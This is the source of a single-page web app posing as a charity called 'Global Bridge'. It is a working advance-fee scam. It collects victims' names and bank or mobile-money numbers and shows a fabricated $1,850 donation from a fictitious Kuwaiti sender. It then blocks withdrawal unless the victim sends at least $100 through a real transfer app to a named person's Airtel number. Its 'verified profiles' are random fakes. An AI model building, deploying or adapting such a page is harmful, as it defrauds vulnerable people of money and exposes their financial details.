<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Bridge Support</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Utility styles for the animations and UI effects */
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .blinking { animation: blink 1s linear infinite; }
        .glass { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); }
        
        /* Matching the landing page gradient and background from image_0.png */
        .landing-bg {
            background-image: linear-gradient(0deg, rgba(0,0,0,0.85) 0%, rgba(0,0,0,0.5) 100%), url('https://image.shutterstock.com/image-photo/group-joyful-poor-indian-children-260nw-1051512401.jpg'); /* Representative Image of Smiling Children */
            background-size: cover;
            background-position: center;
        }

        /* Styling the brown border button from image_0.png */
        .btn-need-support {
            border: 1px solid rgba(255, 255, 255, 0.3);
            background-color: rgba(93, 64, 55, 0.3); /* Transparent Brown */
        }
        
        /* Modal and dropdown scrolling */
        .no-scrollbar::-webkit-scrollbar { display: none; }
        .country-modal { max-height: 80vh; }
    </style>
</head>
<body class="bg-gray-100 font-sans leading-normal tracking-normal overflow-x-hidden">

    <div id="app-container">
        </div>

    <script src="https://cdn.jsdelivr.net/npm/country-flag-emoji-json@2.0.0/dist/index.js"></script>

    <script>
        // --- DATA & CONFIG (Retained from your previous requirement) ---
        const PARTNERS = [
            { name: "Sendwave", icon: "📱", region: "Africa & SE Asia", countries: "Uganda, Kenya, Nigeria", link: "https://play.google.com/store/apps/details?id=com.sendwave", desc: "Instant Mobile Money transfers with 0 fees." },
            { name: "Remitly", icon: "⚡", region: "Asia & LatAm", countries: "Philippines, India, Mexico", link: "https://play.google.com/store/apps/details?id=com.remitly.app", desc: "Reliable bank deposits and cash pickups." },
            { name: "Wise", icon: "🌍", region: "Europe & North America", countries: "UK, USA, Canada, Germany", link: "https://play.google.com/store/apps/details?id=com.transferwise.android", desc: "Real mid-market exchange rates for low fees." },
            { name: "WorldRemit", icon: "🛰️", region: "Global Reach", countries: "Zimbabwe, Ethiopia, SA", link: "https://play.google.com/store/apps/details?id=com.worldremit.android", desc: "Send to 130+ countries via airtime or cash." },
            { name: "RIA Money", icon: "🏦", region: "Americas & Europe", countries: "Mexico, Spain, Italy", link: "https://play.google.com/store/apps/details?id=com.riafinancial.moneytransfer", desc: "Massive network for cash pickups." },
            { name: "Transfast", icon: "🧧", region: "Middle East & India", countries: "UAE, Qatar, Kuwait, India", link: "https://play.google.com/store/apps/details?id=com.transfast.app", desc: "Strongest for direct bank deposits in GCC." }
        ];

        // --- STATE MANAGEMENT ---
        let state = JSON.parse(localStorage.getItem('gb_state')) || {
            currentPage: 'landing',
            user: null,
            walletBalance: 0,
            raised: 0,
            hasDonation: false,
            profiles: [],
            selectedCountry: null,
            searchTerm: ''
        };

        function saveState() {
            localStorage.setItem('gb_state', JSON.stringify(state));
        }

        function navigate(page) {
            state.currentPage = page;
            saveState();
            render();
        }

        // --- UI GENERATORS ---
        function render() {
            const container = document.getElementById('app-container');
            
            // 1. Updated Landing Page (Exact match for image_0.png)
            if (state.currentPage === 'landing') {
                container.innerHTML = `
                    <div class="h-screen landing-bg text-center flex flex-col justify-between">
                        <header class="flex justify-between items-center px-6 py-3 border-b border-white/10 bg-black/30">
                            <div class="flex items-center gap-2">
                                <div class="bg-blue-600 w-7 h-7 rounded flex items-center justify-center font-bold text-white text-lg">G</div>
                                <span class="font-bold text-white text-lg">Global Bridge</span>
                            </div>
                            <span class="text-[10px] text-gray-400 font-medium uppercase tracking-widest">Secure Verified Engine</span>
                        </header>

                        <div class="flex-1 flex flex-col items-center justify-center p-6 text-white max-w-lg mx-auto">
                            <img src="https://image.shutterstock.com/image-photo/group-joyful-poor-indian-children-260nw-1051512401.jpg" class="w-24 h-24 rounded-full border-4 border-blue-600/60 shadow-xl mb-6 object-cover">
                            
                            <h1 class="text-4xl font-bold mb-1 leading-tight">Empowering Communities</h1>
                            <h2 class="text-3xl font-extrabold text-blue-400 mb-4 leading-tight">Through Direct Giving</h2>
                            
                            <p class="text-xs text-gray-200 mb-8 max-w-sm">A verified peer-to-peer platform connecting global generosity with local potential.</p>
                            
                            <div class="flex gap-4 w-full">
                                <button onclick="navigate('login')" class="flex-1 btn-need-support text-white py-3 rounded-lg font-semibold text-xs transition hover:bg-brown-600/50">I need support</button>
                                <button onclick="navigate('dashboard')" class="flex-1 bg-blue-600 text-white py-3 rounded-lg font-semibold text-xs transition hover:bg-blue-700">I want to support</button>
                            </div>
                        </div>
                    </div>`;
            } 
            
            // 2. Updated Login Page (With Country Search Button)
            else if (state.currentPage === 'login') {
                container.innerHTML = `
                    <div class="min-h-screen p-6 bg-gray-50">
                        <div class="max-w-md mx-auto bg-white rounded-2xl shadow-lg p-8">
                            <h2 class="text-2xl font-bold text-gray-800 mb-6 border-b pb-2">Submit Profile</h2>
                            <form onsubmit="handleLogin(event)" class="space-y-4">
                                <input type="text" id="fullName" placeholder="Full Name" required class="w-full p-3 border rounded-lg text-sm">
                                
                                <button type="button" onclick="openCountryModal()" id="countryButton" class="w-full p-3 border rounded-lg text-sm text-gray-600 text-left flex justify-between items-center">
                                    <span id="selectedCountryLabel">Select Your Country (choose yours)</span>
                                    <span>▼</span>
                                </button>
                                
                                <input type="text" id="location" placeholder="City/Location" required class="w-full p-3 border rounded-lg text-sm">
                                <input type="text" id="category" placeholder="Category (e.g. Education, Health)" required class="w-full p-3 border rounded-lg text-sm">
                                <input type="number" id="goal" placeholder="Support Goal Amount ($)" required class="w-full p-3 border rounded-lg text-sm">
                                <input type="text" id="accName" placeholder="Account Name" required class="w-full p-3 border rounded-lg text-sm">
                                <input type="text" id="accNum" placeholder="Bank/Mobile Money Number" required class="w-full p-3 border rounded-lg text-sm">
                                <textarea id="story" placeholder="Your story why you need support..." required class="w-full p-3 border rounded-lg h-24 text-sm"></textarea>
                                <button type="submit" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold text-sm hover:bg-blue-700">SUBMIT PROFILE FOR VERIFICATION</button>
                            </form>
                        </div>
                    </div>`;
            }

            // 3. Dashboard Page (Retained)
            else if (state.currentPage === 'dashboard') {
                container.innerHTML = `
                    <div class="min-h-screen bg-gray-100 pb-20">
                        <header class="bg-white shadow-sm p-4 sticky top-0 z-10 flex justify-between items-center">
                            <h1 class="text-xl font-bold text-blue-800">Verified Profiles</h1>
                            <button onclick="navigate('wallet')" class="bg-blue-100 text-blue-700 px-4 py-2 rounded-lg font-bold text-sm">My Global Bridge Wallet</button>
                        </header>
                        
                        <div class="p-4 space-y-4 max-w-2xl mx-auto">
                            <div class="bg-blue-50 border-2 border-blue-200 rounded-2xl p-4 shadow-md">
                                <div class="flex items-center gap-4 mb-3">
                                    <div class="w-16 h-16 bg-white rounded-full flex items-center justify-center text-4xl shadow-inner">
                                        ${getFlag(state.user.country)}
                                    </div>
                                    <div>
                                        <h3 class="font-bold text-lg">${state.user.fullName} (You)</h3>
                                        <p class="text-sm text-gray-600">${state.user.country} 📍</p>
                                    </div>
                                </div>
                                <div class="mb-4">
                                    <div class="flex justify-between text-xs font-bold mb-1">
                                        <span>Raised: $${state.raised}</span>
                                        <span>Goal: $${state.user.goal}</span>
                                    </div>
                                    <div class="w-full bg-gray-200 h-3 rounded-full overflow-hidden">
                                        <div class="bg-green-500 h-full" style="width: ${(state.raised/state.user.goal)*100}%"></div>
                                    </div>
                                </div>
                                <div class="flex gap-2">
                                    <button onclick="triggerEpay()" class="flex-1 bg-blue-600 text-white py-2 rounded-lg text-sm font-bold">Support Now</button>
                                    <button onclick="navigate('wallet')" class="flex-1 bg-white border border-blue-600 text-blue-600 py-2 rounded-lg text-sm font-bold">My Wallet</button>
                                </div>
                            </div>

                            ${state.profiles.map(p => `
                                <div class="bg-white rounded-2xl p-4 shadow-sm border border-gray-100">
                                    <div class="flex items-center gap-4 mb-3">
                                        <img src="https://i.pravatar.cc/150?u=${p.name}" class="w-14 h-14 rounded-full bg-gray-200">
                                        <div>
                                            <h3 class="font-bold text-gray-800">${p.name}</h3>
                                            <p class="text-xs text-gray-500">${p.country} ${getFlag(p.country)}</p>
                                        </div>
                                    </div>
                                    <p class="text-sm text-gray-600 mb-3 italic">"${p.story}"</p>
                                    <p class="text-xs font-mono text-gray-400 mb-2">Acc: ${p.acc}</p>
                                    <div class="flex justify-between text-xs font-bold mb-1">
                                        <span>Raised: $${p.raised}</span>
                                        <span>Goal: $${p.goal}</span>
                                    </div>
                                    <button onclick="alert('Download partner app to support: ' + '${p.acc}')" class="w-full bg-gray-100 text-gray-700 py-2 rounded-lg text-sm font-bold hover:bg-gray-200">Support Project</button>
                                </div>
                            `).join('')}
                        </div>
                    </div>`;
            }

            // 4. Wallet Page (Retained)
            else if (state.currentPage === 'wallet') {
                container.innerHTML = `
                    <div class="min-h-screen bg-blue-900 text-white p-4">
                        <div class="flex justify-between items-center mb-6">
                            <span class="text-xs tracking-widest font-black opacity-70">GLOBAL BRIDGE EPAY</span>
                            <button onclick="navigate('dashboard')" class="bg-white/10 p-2 rounded-lg text-xs">BACK</button>
                        </div>

                        <div class="text-center mb-8">
                            <h1 class="text-2xl font-bold tracking-tighter mb-1">GLOBAL<span class="text-blue-400">BRIDGE</span> WALLET</h1>
                            <p class="text-[10px] opacity-60">Official Digital Asset Management</p>
                        </div>

                        <div class="bg-white/10 rounded-3xl p-6 border border-white/20 mb-6">
                            <p class="text-xs opacity-70 mb-1">${state.user.fullName} | ${state.user.accNum}</p>
                            <h2 class="text-sm font-bold mb-4">Available Balance</h2>
                            <div class="flex flex-col gap-1 ${state.walletBalance > 0 ? 'blinking text-green-400' : ''}">
                                <span class="text-4xl font-bold">$${state.walletBalance.toLocaleString()}</span>
                                <span class="text-lg opacity-80">≈ ${getLocalCurrency(state.walletBalance, state.user.country)}</span>
                            </div>
                        </div>

                        <div class="flex gap-4 mb-8">
                            <button onclick="triggerLimitError()" class="flex-1 bg-white text-blue-900 py-4 rounded-2xl font-bold shadow-lg">Withdrawal</button>
                            <button onclick="triggerLimitError()" class="flex-1 bg-white/20 text-white py-4 rounded-2xl font-bold border border-white/30">Send</button>
                        </div>

                        <div class="bg-white rounded-t-3xl -mx-4 p-6 min-h-[400px] text-gray-800">
                            <h3 class="font-bold border-b pb-2 mb-4">Recent Activity</h3>
                            <div id="activity-list" class="space-y-4 mb-8">
                                ${state.hasDonation ? `
                                    <div class="flex justify-between items-center blinking">
                                        <div>
                                            <p class="font-bold text-sm">Donation Received <span class="text-xs bg-green-100 text-green-700 px-2 rounded">VERIFIED</span></p>
                                            <p class="text-xs text-gray-500">From: Lolikishee (Kuwait 🇰🇼)</p>
                                        </div>
                                        <span class="font-bold text-green-600">+$1,850</span>
                                    </div>
                                ` : `<p class="text-center text-gray-400 text-sm py-4">No recent activity/donation</p>`}
                            </div>

                            ${state.hasDonation ? `
                                <div class="bg-amber-50 border border-amber-200 p-4 rounded-xl text-[11px] mb-8 leading-relaxed">
                                    <p class="font-bold text-amber-800 mb-1 uppercase">Official Security Note:</p>
                                    Transaction received is approximately above your limitation. Follow policies to secure withdrawal to ${state.user.accName} (${state.user.accNum}). Download a partner wallet below to sync and access funds.
                                </div>
                            ` : ''}

                            <div class="text-center mb-6">
                                <h4 class="font-bold text-sm mb-1 uppercase">Partner Digital Wallets</h4>
                                <p class="text-[10px] text-gray-500 px-4">Download the best money transfer app for your location to access your registered account.</p>
                            </div>

                            <div class="grid grid-cols-1 gap-3">
                                ${PARTNERS.map(app => `
                                    <a href="${app.link}" target="_blank" class="flex items-center gap-4 p-3 border rounded-xl hover:bg-gray-50 transition">
                                        <span class="text-2xl">${app.icon}</span>
                                        <div class="flex-1">
                                            <div class="flex justify-between">
                                                <p class="font-bold text-sm">${app.name}</p>
                                                <span class="text-[9px] bg-blue-100 text-blue-700 px-2 py-0.5 rounded-full font-bold">${app.region}</span>
                                            </div>
                                            <p class="text-[10px] text-gray-600 line-clamp-1">${app.desc}</p>
                                        </div>
                                    </a>
                                `).join('')}
                            </div>

                            <div class="flex justify-end mt-6">
                                <button onclick="navigate('dashboard')" class="bg-gray-200 text-gray-600 px-6 py-2 rounded-lg font-bold text-xs">BACK</button>
                            </div>
                        </div>
                    </div>`;
            }
        }

        // --- NEW GLOBAL COUNTRY LOGIC ---
        
        function openCountryModal() {
            // Close any existing modal first
            const existing = document.getElementById('countrySelectModal');
            if (existing) document.body.removeChild(existing);

            state.searchTerm = ''; // Reset search

            const modal = document.createElement('div');
            modal.id = 'countrySelectModal';
            modal.className = "fixed inset-0 bg-black/70 flex items-center justify-center z-[110] p-4";
            modal.innerHTML = `
                <div class="bg-white rounded-2xl w-full max-w-sm overflow-hidden shadow-2xl animate-pop-in flex flex-col country-modal">
                    <div class="p-4 border-b">
                        <input type="text" id="countrySearch" placeholder="Search countries..." class="w-full p-3 border rounded-lg text-sm mb-2 focus:ring-1 focus:ring-blue-400 focus:outline-none">
                        <div class="text-[10px] text-gray-400 font-medium uppercase tracking-widest text-center mt-1">Select your Country</div>
                    </div>
                    
                    <div id="countryList" class="flex-1 overflow-y-auto no-scrollbar p-2">
                        </div>

                    <div class="p-2 border-t text-center">
                        <button onclick="closeCountryModal()" class="text-sm font-semibold text-gray-500 py-2">Close</button>
                    </div>
                </div>
            `;
            document.body.appendChild(modal);

            // Populate initially
            renderCountryList();

            // Set up search listener
            document.getElementById('countrySearch').addEventListener('input', (e) => {
                state.searchTerm = e.target.value.toLowerCase();
                renderCountryList();
            });
        }

        function closeCountryModal() {
            const modal = document.getElementById('countrySelectModal');
            if (modal) document.body.removeChild(modal);
        }

        function selectCountry(country) {
            state.selectedCountry = country;
            closeCountryModal();
            // Update the main login form button label
            document.getElementById('selectedCountryLabel').innerHTML = `
                ${country.emoji} ${country.name}
            `;
            document.getElementById('selectedCountryLabel').classList.remove('text-gray-600');
            document.getElementById('selectedCountryLabel').classList.add('text-black');
            saveState();
        }

        function renderCountryList() {
            const list = document.getElementById('countryList');
            
            // Filter the global country dataset based on search term
            const filteredCountries = window.countryFlagEmojiData.filter(c => 
                c.name.toLowerCase().includes(state.searchTerm)
            );

            if (filteredCountries.length === 0) {
                list.innerHTML = `<p class="text-center text-gray-400 text-sm py-8">No countries found for "${state.searchTerm}"</p>`;
                return;
            }

            list.innerHTML = filteredCountries.map(country => `
                <button type="button" onclick='selectCountry(${JSON.stringify(country).replace(/'/g, "&apos;")})' class="w-full text-left p-3 hover:bg-blue-50 rounded-lg flex items-center gap-3 transition">
                    <span class="text-3xl">${country.emoji}</span>
                    <span class="text-sm font-medium text-gray-800 flex-1">${country.name}</span>
                    ${state.selectedCountry?.code === country.code ? '<span class="text-blue-600 text-xl">✓</span>' : ''}
                </button>
            `).join('');
        }

        // --- RETAINED LOGIC FUNCTIONS ---
        function handleLogin(e) {
            e.preventDefault();

            // Check if country was actually selected
            if (!state.selectedCountry) {
                alert("Please select your country first (view all countries in the world).");
                return;
            }

            state.user = {
                fullName: document.getElementById('fullName').value,
                country: state.selectedCountry.name, // Save the selected name
                goal: document.getElementById('goal').value,
                accNum: document.getElementById('accNum').value,
                accName: document.getElementById('accName').value
            };
            
            showLoading("Submitting your story for public support globally...", 7000, () => {
                generateProfiles();
                navigate('dashboard');
            });
        }

        function triggerEpay() {
            showLoading("Initiating $1,850 on your Global Bridge wallet as donation from lolikishee Kuwait...", 8000, () => {
                showNotification({
                    title: "Deposit Detected: $1,850",
                    body: `Sender: Lolikishee<br>Origin: Kuwait City, KW<br>Receiver: ${state.user.accName}<br>Account: ${state.user.accNum}`,
                    onOk: () => {
                        state.walletBalance = 1850;
                        state.raised = 1850;
                        state.hasDonation = true;
                        saveState();
                        navigate('wallet');
                    }
                });
            });
        }

        function triggerLimitError() {
            showLoading(`Configuring deposit of $1,850 to ${state.user.accNum}...`, 7000, () => {
                showNotification({
                    title: "ACCOUNT NOT SUPPORTED",
                    body: `
                        <div class="text-left text-xs space-y-3">
                            <p class="font-bold text-red-600">ERROR: ACCOUNT ${state.user.accNum} NOT SUPPORTED BY GB WALLET DIRECTLY.</p>
                            <p><strong>Step 1:</strong> Download a partner wallet (Sendwave, Wise, etc.) and create an account.</p>
                            <p><strong>Step 2:</strong> Due to limit policies, support a verified profile with min. $100 to sync your account.</p>
                            <div class="p-3 bg-blue-50 rounded border border-blue-100">
                                <p class="font-bold">Support Brenda Ajaimbo <span class="blinking">🇺🇬</span></p>
                                <p>Airtel: +256746463845</p>
                                <p>Goal: $670 | Education</p>
                            </div>
                            <p class="italic text-[10px]">Note: Recharge your partner wallet with $100+ and donate to Brenda to unlock your $1,850 withdrawal.</p>
                        </div>
                    `,
                    onOk: () => {}
                });
            });
        }

        // --- HELPERS ---
        function showLoading(msg, time, callback) {
            const overlay = document.createElement('div');
            overlay.className = "fixed inset-0 bg-black/80 flex items-center justify-center z-[200] p-6 text-center";
            overlay.innerHTML = `
                <div class="text-white">
                    <div class="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
                    <p class="font-bold text-lg">${msg}</p>
                </div>
            `;
            document.body.appendChild(overlay);
            setTimeout(() => {
                document.body.removeChild(overlay);
                callback();
            }, time);
        }

        function showNotification({title, body, onOk}) {
            const modal = document.createElement('div');
            modal.className = "fixed inset-0 bg-black/60 flex items-center justify-center z-[200] p-6";
            modal.innerHTML = `
                <div class="bg-white rounded-3xl w-full max-w-sm overflow-hidden shadow-2xl animate-pop-in">
                    <div class="p-6 text-center">
                        <h3 class="text-xl font-black text-blue-900 mb-4">${title}</h3>
                        <div class="text-gray-600 mb-6">${body}</div>
                        <button id="notif-ok" class="w-full bg-blue-600 text-white py-4 rounded-2xl font-bold shadow-lg text-sm hover:bg-blue-700">OKAY, I UNDERSTAND</button>
                    </div>
                </div>
            `;
            document.body.appendChild(modal);
            document.getElementById('notif-ok').onclick = () => {
                document.body.removeChild(modal);
                onOk();
            };
        }

        function generateProfiles() {
            // Simplified country mapping for profile generation, using names from the global data if available
            const countries = ["Uganda", "Kenya", "United States", "India", "UK", "Nigeria"];
            const names = ["James O.", "Sarah L.", "Amara K.", "Juan P.", "Anita W.", "David B."];
            const stories = ["Needs medical support for surgery.", "Tuition fees for final year.", "Starting a small farming business.", "Relief after community flooding.", "Capital for a local grocery shop."];
            
            state.profiles = Array.from({length: 25}, (_, i) => {
                const goal = Math.floor(Math.random() * 2000) + 500;
                return {
                    name: names[i % names.length] + " " + (i + 1),
                    country: countries[i % countries.length],
                    goal: goal,
                    raised: Math.floor(Math.random() * goal),
                    story: stories[i % stories.length],
                    acc: "+" + Math.floor(Math.random() * 90000000000)
                };
            });
            saveState();
        }

        function getFlag(cName) {
            // Retain old flag mapping for profile display, or map to new names
            const flags = {"Uganda":"🇺🇬", "Kenya":"🇰🇪", "USA":"🇺🇸", "UK":"🇬🇧", "Kuwait":"🇰🇼", "Nigeria":"🇳🇬", "Philippines":"🇵🇭", "India":"🇮🇳", "Ghana":"🇬🇭", "United States":"🇺🇸"};
            return flags[cName] || "🏳️";
        }

        function getLocalCurrency(usd, country) {
            const rates = {"Uganda": 3800, "Kenya": 130, "Kuwait": 0.31, "UK": 0.79, "Nigeria": 1500};
            const symbols = {"Uganda": "UGX", "Kenya": "KES", "Kuwait": "KWD", "UK": "GBP", "Nigeria": "NGN"};
            const rate = rates[country] || 1;
            const symbol = symbols[country] || "$";
            return (usd * rate).toLocaleString() + " " + symbol;
        }

        // Initialize
        render();
    </script>
</body>
</html>
